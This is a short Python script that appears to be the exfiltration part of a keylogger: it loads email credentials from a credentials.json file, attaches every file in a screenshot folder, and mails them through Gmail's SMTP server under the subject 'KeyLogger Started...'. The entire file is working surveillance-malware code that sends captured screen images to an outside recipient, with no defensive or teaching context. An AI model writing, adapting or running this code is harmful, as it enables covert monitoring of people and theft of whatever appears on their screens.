
import json
import mimetypes
import smtplib
from email.message import EmailMessage
from pathlib import Path

def SendMail(screenshot_dir: str = "./screenshot") -> None:
    credentials_path = Path(__file__).with_name("credentials.json")
    with credentials_path.open("r", encoding="utf-8") as f:
        data = json.load(f)

    email_address = data["email"]
    email_password = data["password"]
    recipient = data.get("recipient")
    if not recipient:
        raise ValueError("Missing 'recipient' in credentials.json")

    #print(EMAIL_ADDRESS,EMAIL_PASSWORD)


    msg = EmailMessage()
    msg["Subject"] = "KeyLogger Started..."
    msg["From"] = email_address
    msg["To"] = recipient

    msg.set_content('This is a plain text email')
    screenshot_path = Path(screenshot_dir)
    for image_path in sorted(screenshot_path.iterdir()):
        if not image_path.is_file():
            continue
        print(f"{image_path.name} sent")
        file_data = image_path.read_bytes()
        mime_type, _ = mimetypes.guess_type(image_path.name)
        if mime_type:
            maintype, subtype = mime_type.split("/", 1)
        else:
            maintype, subtype = "application", "octet-stream"
        msg.add_attachment(
            file_data,
            maintype=maintype,
            subtype=subtype,
            filename=image_path.name,
        )


    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(email_address, email_password)
        smtp.send_message(msg)


if __name__ == "__main__":
    SendMail()
